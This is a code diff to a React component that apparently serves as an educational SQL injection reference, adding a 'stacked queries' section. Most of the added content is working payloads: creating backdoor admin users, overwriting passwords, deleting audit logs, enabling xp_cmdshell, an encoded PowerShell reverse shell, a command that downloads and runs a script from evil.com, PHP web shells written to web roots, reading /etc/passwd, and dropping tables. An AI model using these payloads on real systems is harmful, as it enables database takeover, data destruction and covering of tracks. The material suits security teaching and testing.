@@ -877,6 +877,221 @@ const SQLInjectionVulnerabilityDetails = () => {
           difficulty: "advanced"
         }
       ]
+    },
+    "stacked-queries": {
+      title: "Stacked Queries SQL Injection",
+      explanation: "Stacked queries (also called piggy-backed or batched queries) allow execution of multiple SQL statements in a single query by using the semicolon separator. This technique enables attackers to run arbitrary SQL commands beyond data extraction, including INSERT, UPDATE, DELETE, and even system commands on vulnerable databases. While not all database/driver combinations support stacked queries, when available, this represents one of the most powerful SQL injection attack vectors.",
+      whereItAppears: [
+        "API endpoints using database drivers that support batch execution",
+        "Legacy applications with poorly configured database connections",
+        "Applications using direct SQL execution without parameterized queries",
+        "Admin interfaces with privileged database connections",
+        "Stored procedure execution points with elevated permissions",
+        "Database management interfaces and SQL query builders"
+      ],
+      impact: "Stacked queries enable complete database control including data modification (INSERT/UPDATE/DELETE), schema changes (DROP/CREATE), privilege escalation (GRANT), and on some databases (MSSQL), operating system command execution via xp_cmdshell. This can lead to complete system compromise, persistent backdoors, data destruction, and lateral movement across the network. The ability to execute arbitrary statements makes this significantly more dangerous than read-only injection techniques.",
+      realWorldScenarios: [
+        {
+          title: "Database Backdoor Creation",
+          scenario: "An attacker uses stacked queries to insert a new admin user into the application's user table, creating a persistent backdoor for future unauthorized access.",
+          payload: "'; INSERT INTO users(username, password, role) VALUES('backdoor', 'hashed_password', 'admin');--",
+          impact: "Persistent unauthorized admin access, complete application takeover, ability to return at any time using the created credentials."
+        },
+        {
+          title: "MSSQL Command Execution",
+          scenario: "On a Microsoft SQL Server with xp_cmdshell enabled, attacker executes operating system commands to download and run a reverse shell.",
+          payload: "'; EXEC xp_cmdshell 'powershell -c IEX(IWR https://evil.com/shell.ps1)';--",
+          impact: "Full server compromise, reverse shell access, ability to pivot to internal network, ransomware deployment."
+        },
+        {
+          title: "Data Destruction Attack",
+          scenario: "Malicious actor uses stacked queries to drop critical database tables, causing massive data loss and service disruption.",
+          payload: "'; DROP TABLE customers; DROP TABLE orders; DROP TABLE products;--",
+          impact: "Complete data loss, business disruption, potential unrecoverable damage if backups are not available."
+        }
+      ],
+      payloads: [
+        {
+          name: "Basic Stacked Query Test",
+          code: "'; SELECT SLEEP(5);--",
+          database: "MySQL",
+          complexity: "Beginner",
+          technique: "Verification",
+          description: "Tests if stacked queries are supported using time delay. If page response is delayed by 5 seconds, stacked queries work.",
+          difficulty: "beginner"
+        },
+        {
+          name: "MSSQL Stacked Query Test",
+          code: "'; WAITFOR DELAY '0:0:5';--",
+          database: "MSSQL",
+          complexity: "Beginner",
+          technique: "Verification",
+          description: "Tests stacked query support on SQL Server using WAITFOR DELAY. 5-second delay confirms vulnerability.",
+          difficulty: "beginner"
+        },
+        {
+          name: "Insert Admin User",
+          code: "'; INSERT INTO users (username, password, is_admin) VALUES ('hacker', 'password123', 1);--",
+          database: "MySQL",
+          complexity: "Intermediate",
+          technique: "Data Manipulation",
+          description: "Creates new admin user in database for persistent access. Requires knowledge of table structure.",
+          difficulty: "intermediate"
+        },
+        {
+          name: "Update User Password",
+          code: "'; UPDATE users SET password='newpassword' WHERE username='admin';--",
+          database: "MySQL",
+          complexity: "Intermediate",
+          technique: "Data Manipulation",
+          description: "Changes admin password to known value for account takeover. Highly effective if you know username exists.",
+          difficulty: "intermediate"
+        },
+        {
+          name: "Delete Audit Logs",
+          code: "'; DELETE FROM audit_logs WHERE 1=1;--",
+          database: "MySQL",
+          complexity: "Intermediate",
+          technique: "Data Manipulation",
+          description: "Deletes all audit trail records to cover tracks. Often done after successful attack to hide evidence.",
+          difficulty: "intermediate"
+        },
+        {
+          name: "MSSQL Enable xp_cmdshell",
+          code: "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--",
+          database: "MSSQL",
+          complexity: "Advanced",
+          technique: "Privilege Escalation",
+          description: "Enables xp_cmdshell stored procedure for OS command execution. Required before running system commands.",
+          difficulty: "advanced"
+        },
+        {
+          name: "MSSQL Command Execution",
+          code: "'; EXEC xp_cmdshell 'whoami';--",
+          database: "MSSQL",
+          complexity: "Advanced",
+          technique: "Command Execution",
+          description: "Executes operating system command via xp_cmdshell. Returns current user context of SQL Server service.",
+          difficulty: "advanced"
+        },
+        {
+          name: "MSSQL Reverse Shell",
+          code: "'; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxACIALAA0ADQANAA0ACkA';--",
+          database: "MSSQL",
+          complexity: "Advanced",
+          technique: "Command Execution",
+          description: "PowerShell-based reverse shell via xp_cmdshell. Base64 encoded to bypass command line restrictions.",
+          difficulty: "advanced"
+        },
+        {
+          name: "PostgreSQL File Write",
+          code: "'; COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';--",
+          database: "PostgreSQL",
+          complexity: "Advanced",
+          technique: "Persistence",
+          description: "Writes PHP web shell to web root for persistent access. Requires write permissions to web directory.",
+          difficulty: "advanced"
+        },
+        {
+          name: "PostgreSQL Create Table",
+          code: "'; CREATE TABLE exfil (data TEXT); COPY exfil FROM '/etc/passwd';--",
+          database: "PostgreSQL",
+          complexity: "Advanced",
+          technique: "Data Extraction",
+          description: "Creates table and copies file contents into it for later extraction. Useful for file system access.",
+          difficulty: "advanced"
+        },
+        {
+          name: "MySQL File Write",
+          code: "'; SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php';--",
+          database: "MySQL",
+          complexity: "Advanced",
+          technique: "Persistence",
+          description: "Writes web shell using INTO OUTFILE. Requires FILE privilege and secure_file_priv not set.",
+          difficulty: "advanced"
+        },
+        {
+          name: "Grant All Privileges",
+          code: "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password' WITH GRANT OPTION;--",
+          database: "MySQL",
+          complexity: "Advanced",
+          technique: "Privilege Escalation",
+          description: "Creates super user with all database privileges accessible from any host. Complete database takeover.",
+          difficulty: "advanced"
+        },
+        {
+          name: "Oracle Execute Immediate",
+          code: "'; EXECUTE IMMEDIATE 'CREATE USER hacker IDENTIFIED BY password123';--",
+          database: "Oracle",
+          complexity: "Advanced",
+          technique: "Privilege Escalation",
+          description: "Creates new Oracle database user using EXECUTE IMMEDIATE. Requires CREATE USER privilege.",
+          difficulty: "advanced"
+        },
+        {
+          name: "Drop Table Attack",
+          code: "'; DROP TABLE users;--",
+          database: "MySQL",
+          complexity: "Intermediate",
+          technique: "Data Manipulation",
+          description: "Destructive attack that removes entire table. Can cause catastrophic data loss if backups don't exist.",
+          difficulty: "intermediate"
+        },
+        {
+          name: "Truncate Table Attack",
+          code: "'; TRUNCATE TABLE orders;--",
+          database: "MySQL",
+          complexity: "Intermediate",
+          technique: "Data Manipulation",
+          description: "Removes all data from table without dropping structure. Faster than DELETE and can't be rolled back easily.",
+          difficulty: "intermediate"
+        },
+        {
+          name: "Create Trigger Backdoor",
+          code: "'; CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW EXECUTE PROCEDURE log_to_external();--",
+          database: "PostgreSQL",
+          complexity: "Advanced",
+          technique: "Persistence",
+          description: "Creates database trigger for persistent backdoor. Executes on every insert, survives restarts.",
+          difficulty: "advanced"
+        },
+        {
+          name: "MSSQL Add Admin User",
+          code: "'; EXEC sp_addlogin 'hacker', 'Password123!'; EXEC sp_addsrvrolemember 'hacker', 'sysadmin';--",
+          database: "MSSQL",
+          complexity: "Advanced",
+          technique: "Privilege Escalation",
+          description: "Creates SQL Server login and adds to sysadmin role. Complete database server compromise.",
+          difficulty: "advanced"
+        },
+        {
+          name: "Disable Security Features",
+          code: "'; UPDATE pg_settings SET setting='off' WHERE name='log_statement';--",
+          database: "PostgreSQL",
+          complexity: "Advanced",
+          technique: "Evasion",
+          description: "Disables query logging to hide malicious activity. Part of covering tracks after compromise.",
+          difficulty: "advanced"
+        },
+        {
+          name: "MSSQL OLE Automation",
+          code: "'; DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell', @shell OUTPUT; EXEC sp_oamethod @shell, 'run', null, 'cmd.exe /c whoami > C:\\\\output.txt';--",
+          database: "MSSQL",
+          complexity: "Advanced",
+          technique: "Command Execution",
+          description: "Uses OLE Automation procedures for command execution when xp_cmdshell is disabled.",
+          difficulty: "advanced"
+        },
+        {
+          name: "Batch Delete with Condition",
+          code: "'; DELETE FROM sessions WHERE user_id != (SELECT id FROM users WHERE username='hacker');--",
+          database: "MySQL",
+          complexity: "Intermediate",
+          technique: "Data Manipulation",
+          description: "Logs out all users except attacker by deleting their sessions. Maintains attacker access while disrupting others.",
+          difficulty: "intermediate"
+        }
+      ]
     }
   };
 
@@ -1024,7 +1239,7 @@ const SQLInjectionVulnerabilityDetails = () => {
               <h3 className="text-lg font-semibold text-foreground mb-4">
                 Select SQL Injection Type
               </h3>
-              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
+              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4">
                 {Object.entries(sqlTypes)?.map(([key, data]) => (
                   <button
                     key={key}
